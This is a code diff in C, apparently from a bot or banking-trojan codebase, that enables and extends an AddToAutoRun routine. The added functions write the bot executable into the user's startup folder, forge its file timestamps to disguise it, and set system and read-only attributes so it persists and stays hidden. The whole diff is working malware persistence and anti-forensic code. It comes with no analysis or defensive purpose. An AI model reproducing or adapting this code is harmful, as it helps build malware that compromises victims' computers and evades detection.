@@ -136,34 +136,61 @@ void SetFakeFileDateTimeW(PWCHAR Path)
 //}
 
 
-//void AddToAutoRun(WCHAR *TempFileName)
-//{
-//	if ( pGetFileAttributesW( TempFileName ) != 0 )
-//	{
-//		WCHAR *BotPath = GetShellFoldersKey( 1 );
-//		if ( BotPath == NULL )
-//		{
-//			return;
-//		}
-//
-//		plstrcatW( BotPath, BOT_FILE_NAME );
-//
-//		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );
-//
-//		pCopyFileW( TempFileName, BotPath, FALSE );
-//
-//		SetFakeFileDateTime( BotPath );
-//
-//		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-//
-//		pDeleteFileW( TempFileName );
-//
-//		MemFree( BotPath );
-//	}
-//
-//	return;
-//}
+void AddToAutoRun( WCHAR *TempFileName )
+{	
+	if ( pGetFileAttributesW( TempFileName ) != 0 )
+	{
+		WCHAR *BotPath = GetShellFoldersKey( 1 );
+		if ( BotPath == NULL )
+		{
+			return;
+		}
 
+		plstrcatW( BotPath, BOT_FILE_NAME );
+
+		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );
+
+		pCopyFileW( TempFileName, BotPath, FALSE );
+
+		SetFakeFileDateTimeW( BotPath );
+
+		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+	
+		pDeleteFileW( TempFileName );
+
+		MemFree( BotPath );
+	}
+
+	return;
+}
+
+void AddToAutoRun(void *body, DWORD size)
+{	
+	WCHAR *BotPath = GetShellFoldersKey( 1 );
+	if ( BotPath == NULL )
+	{
+		return;
+	}
+
+	plstrcatW( BotPath, BOT_FILE_NAME );
+	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );
+
+	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	DWORD  written = 0;
+	if (f != INVALID_HANDLE_VALUE)
+	{
+		pWriteFile(f, body, size, &written, NULL);
+		pCloseHandle(f);
+	}
+
+	if (written == size)
+	{
+		SetFakeFileDateTimeW( BotPath );
+		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+	}
+
+	MemFree( BotPath );
+}
 
 
 
